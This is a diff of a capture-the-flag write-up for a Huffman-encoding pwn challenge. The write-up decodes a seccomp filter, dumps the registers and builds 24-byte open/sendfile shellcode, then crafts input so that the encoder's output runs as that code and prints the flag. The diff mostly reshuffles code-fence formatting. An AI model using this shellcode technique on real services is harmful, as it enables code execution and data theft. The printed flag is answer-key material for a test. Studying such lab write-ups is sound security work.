@@ -14,8 +14,6 @@ description: |
 tags: ["pwn"]
 ---
 
-# Huffman Shellcoding — CDDC2026 (Pwn, 420 pts)
-
 **Flag:** `CDDC2026{huffm4n_sh3llc0d3_c0mpr3ss_2_pwn}`
 
 > There is a service that performs Huffman Encoding.
@@ -39,7 +37,9 @@ The prompt is short but every word matters:
 So the mental model from the description alone:
 
 ```
+
 your input ──Huffman encode──► header || bitstream ──(mmap RWX + call)──► executes as code
+
 ```
 
 The whole challenge is **inverting the encoder**: pick input bytes that _compress into_ the shellcode you want.
@@ -56,6 +56,7 @@ Key facts from the Dockerfile:
 RUN echo "CDDC{test_flag}" > /flag && chmod 444 /flag && chown root:root /flag
 USER ctf
 CMD ["socat","TCP-LISTEN:9000,reuseaddr,fork","EXEC:/home/ctf/huffman_runner,stderr"]
+
 ```
 
 - `/flag` is **world-readable** (mode `444`) → no privesc needed, just read it.
@@ -64,9 +65,11 @@ CMD ["socat","TCP-LISTEN:9000,reuseaddr,fork","EXEC:/home/ctf/huffman_runner,std
 Black-box poking (send bytes, half-close, read reply) revealed the validation surface:
 
 ```
+
 "Error: need at least 2 distinct bytes"
 "Error: input too large"
 "Error: insufficient compression ratio (4.00)"
+
 ```
 
 A 113-byte highly-compressible input produced **no output and no error** — a strong sign the encoded result was being _executed_ (and our junk "code" just crashed silently).
@@ -91,7 +94,9 @@ Disassembling `huffman_runner` (the interesting code lives in `0x401770–0x4021
 The seccomp filter (decoded from the BPF struct in `main`) allows **only**:
 
 ```
+
 open(2), openat(257), read(0), write(1), sendfile(40), close(3), exit_group(231)   → else SIGKILL
+
 ```
 
 I wrote a faithful Python re-implementation of steps 1–6 (`huff_sim.py`) and validated it against the live error messages (e.g. it reproduces the exact `ratio 4.00`).
@@ -114,11 +119,13 @@ A naive `open("/flag")` + `sendfile` that sets up _every_ register is ~30+ bytes
 I couldn't `apt install gdb/strace` in WSL (no package network), so I compiled a tiny **ptrace tracer** (`trace_regs.c`, built with WSL `gcc`) that breakpoints `call rax` (`0x4021c3`) and dumps registers:
 
 ```
+
 RAX = 0x7f7c56e6e000   (buffer base)
 RSI = 2                ← O_RDWR; must be zeroed for open()
 RDX = 0                ← already NULL  → sendfile offset is free!
 R10 = 0x452ab1         ← already huge  → sendfile count is free!
 R8  = 0,  R9 = 0       ← zero registers available
+
 ```
 
 This is the whole game. `rdx` (sendfile offset pointer = NULL) and `r10` (count) are **already correct**, so I only need to **zero `rsi`** for `open`'s `O_RDONLY`. The shellcode collapses to **24 bytes**.
@@ -137,6 +144,7 @@ push  1 ; pop rdi       ; 6a 01 5f       out_fd = 1 (socket)
 mov   al, 0x28          ; b0 28          rax = 40 = sendfile (eax was 0)
 syscall                 ; 0f 05          sendfile(1, fd, NULL=rdx, count=r10) -> flag to socket
 db    "/flag"           ; 2f 66 6c 61 67
+
 ```
 
 Tricks that shaved it to exactly 24 bytes:
@@ -164,12 +172,14 @@ I need the encoder's output `enc` to be _exactly_ those 24 bytes, and the header
 `08 40 01 A8 01 B1 02 B3 02 B5 02 B7 02 3C 03 6A 03` disassemble to:
 
 ```
+
 or  [rax+1], al     ; the 0x08 + modrm 0x40 + disp 0x01 realigns to a 3-byte insn
 test al, 1
 mov cl, 2 ; mov bl, 2 ; mov ch, 2 ; mov bh, 2
 cmp al, 3
 push 3
-```
+
+```bash
 
 — all harmless (touch only `al/flags/cl/bl/ch/bh/rsp`, **preserve `rax`**), and the realign makes the final instruction end **exactly** at the start of `enc` (so it doesn't eat the first shellcode byte). Execution then falls into the 24-byte shellcode.
 
@@ -188,17 +198,21 @@ Counts are picked so fillers > pairs > rare → the realized ranks (hence the wh
 Verified against a local copy of the Docker container first:
 
 ```
+
 send_local(final_in.bin)  ->  b'CDDC{test_flag}\n'
+
 ```
 
 Then remote:
 
 ```
+
 $ python fire_remote.py
 sending 112 bytes to cddc2026.xyz:9000 ...
 attempt 0: b'CDDC2026{huffm4n_sh3llc0d3_c0mpr3ss_2_pwn}\n'
 
 FLAG: CDDC2026{huffm4n_sh3llc0d3_c0mpr3ss_2_pwn}
+
 ```
 
 ---
